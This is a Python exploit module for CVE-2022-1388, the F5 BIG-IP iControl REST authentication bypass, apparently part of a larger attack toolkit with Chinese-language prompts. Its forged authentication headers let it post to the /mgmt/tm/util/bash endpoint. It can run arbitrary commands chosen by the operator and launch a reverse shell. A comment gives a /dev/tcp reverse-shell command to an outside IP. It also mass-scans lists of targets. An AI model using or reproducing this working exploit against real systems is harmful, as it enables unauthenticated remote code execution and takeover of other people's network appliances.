#!/user/bin/env python3
# -*- coding: utf-8 -*-
#!/usr/bin/python3.9
import requests
import urllib3
from libs.public.outprint import OutPrintInfo,OutPrintInfoErr
from libs.public.reqset import ReqSet
from rich.prompt import Prompt
import json
urllib3.disable_warnings()


class Cve_2022_1388:
    def usage(self):
        print('''
        +-----------------------------------------------------------------+
        漏洞名称: F5 BIG-IP iControl Rest API exposed Check                                  
        +-----------------------------------------------------------------+                                     
        ''')


    def check(self,url):
        try:
            target_url = url + "/mgmt/shared/authn/login"
            res = requests.get(target_url, verify=self.ssl, timeout=self.timeout, proxies=self.proxy,headers=self.headers)
            if "resterrorresponse" in res.text:
                OutPrintInfo("Big-IP",f"[b bright_red]Host: {url} F5 iControl Rest API exposed")
                # print(f"\033[0;31;22m[+] Host: {url} F5 iControl Rest API exposed \033[0m")
                return True
            else:
                OutPrintInfo("Big-IP",f"Host: {url} F5 not vulnerability")
                return False
                # print(f"\033[0;32;22m[-] Host: {url} F5 not vulnerability \033[0m")
        except Exception as e:
            OutPrintInfo("Big-IP", f"Host: {url} Connection Fail")
            return False
            # print(f"\033[0;33;22m[x] Host: {url} Connection Fail \033[0m")
    def main(self,target):
        url = target[0].strip("/ ")
        header = target[1]
        self.ssl = target[2]
        proxy = target[3]
        req = ReqSet(header=header, proxy=proxy)
        self.headers = req["header"]
        self.proxy = req["proxy"]
        self.timeout = int(target[4])
        self.usage()
        flag = self.check(url)
        if flag:
            Exp().title()
            Exp().main(url,header,self.ssl,proxy,self.timeout)

class Exp:
    def title(self):
        print('''
         _____  _   _  _____        _____  _____  _____  _____        __   _____  _____  _____ 
        /  __ \| | | ||  ___|      / __  \|  _  |/ __  \/ __  \      /  | |____ ||  _  ||  _  |
        | /  \/| | | || |__  ______`' / /'| |/' |`' / /'`' / /'______`| |     / / \ V /  \ V / 
        | |    | | | ||  __||______| / /  |  /| |  / /    / / |______|| |     \ \ / _ \  / _ \ 
        | \__/\\ \_/ /| |___       ./ /___\ |_/ /./ /___./ /___      _| |_.___/ /| |_| || |_| |
         \____/ \___/ \____/       \_____/ \___/ \_____/\_____/      \___/\____/ \_____/\_____/                                                                                                                                                                                                                                                          
                                                            Author:Caps@BUGFOR
                                                            Github:https://github.com/bytecaps
        ''')

    def headers(self):
        headers = {
            "User-Agent": self.header,
            'Content-Type': 'application/json',
            'Connection': 'keep-alive, x-F5-Auth-Token',
            'X-F5-Auth-Token': 'a',
            'Authorization': 'Basic YWRtaW46'
        }
        return headers

    def check(self,target_url):
        check_url = target_url + '/mgmt/tm/util/bash'
        data = {'command': "run", 'utilCmdArgs': "-c id"}
        try:
            response = requests.post(url=check_url, json=data, headers=self.headers(), verify=self.ssl, timeout=self.timeout,proxies=self.proxy)
            if response.status_code == 200 and 'commandResult' in response.text:
                OutPrintInfo("Big-IP",f"[b bright_red]目标 {target_url} 存在漏洞")
            else:
                OutPrintInfo("Big-IP",f"目标 {target_url} 不存在漏洞")
        except Exception as e:
            OutPrintInfo("Big-IP",f'url 访问异常 {target_url}')

    def attack(self,target_url, cmd):
        attack_url = target_url + '/mgmt/tm/util/bash'
        data = {'command': "run", 'utilCmdArgs': "-c '{0}'".format(cmd)}
        try:
            response = requests.post(url=attack_url, json=data, headers=self.headers(), verify=self.ssl, timeout=self.timeout,proxies=self.proxy)
            if response.status_code == 200 and 'commandResult' in response.text:
                default = json.loads(response.text)
                display = default['commandResult']
                OutPrintInfo("Big-IP",f"[b bright_red]目标 {target_url} 存在漏洞")
                OutPrintInfo("Big-IP",f'响应为:{str(display)}')
            else:
                OutPrintInfo("Big-IP",f"目标 {target_url} 不存在漏洞")
        except Exception as e:
            OutPrintInfo("Big-IP",f'url 访问异常 {target_url}')

    def reverse_shell(self,target_url, command):
        reverse_url = target_url + '/mgmt/tm/util/bash'
        data = {'command': "run", 'utilCmdArgs': "-c '{0}'".format(command)}
        # command: bash -i >&/dev/tcp/192.168.174.129/8888 0>&1
        try:
            requests.post(url=reverse_url, json=data, headers=self.headers(), verify=self.ssl, timeout=self.timeout,proxies=self.proxy)
            OutPrintInfo("Big-IP", "请自行查看是否反弹shell回来")
        except Exception as e:
            OutPrintInfo("Big-IP","请自行查看是否反弹shell回来")

    def scan(self,file):
        for url_link in open(file, 'r', encoding='utf-8'):
            if url_link.strip() != '':
                url_path = self.format_url(url_link.strip())
                self.check(url_path)

    def format_url(self,url):
        try:
            if url[:4] != "http":
                url = "https://" + url
                url = url.strip()
            return url
        except Exception as e:
            OutPrintInfo("Big-IP",f'URL 错误 {url}')

    def main(self,target,header,ssl,proxy,timeout):
        url = target
        self.header = header
        self.ssl = ssl
        proxy = proxy
        self.proxy = {"http":proxy,"https":proxy}
        self.timeout = int(timeout)

        OutPrintInfo("1","执行命令")
        OutPrintInfo("2","反弹shell")
        choose = Prompt.ask("[b bright_yellow]输入对应编号进行利用")
        if choose == "1":
            cmd = Prompt.ask("[b bright_yellow]输入执行命令")
            self.attack(url, cmd)
        elif choose == "2":
            cmd = Prompt.ask("[b bright_yellow]输入执行命令")
            self.reverse_shell(url, cmd)
        else:
            OutPrintInfoErr("请检查输入是否有误")




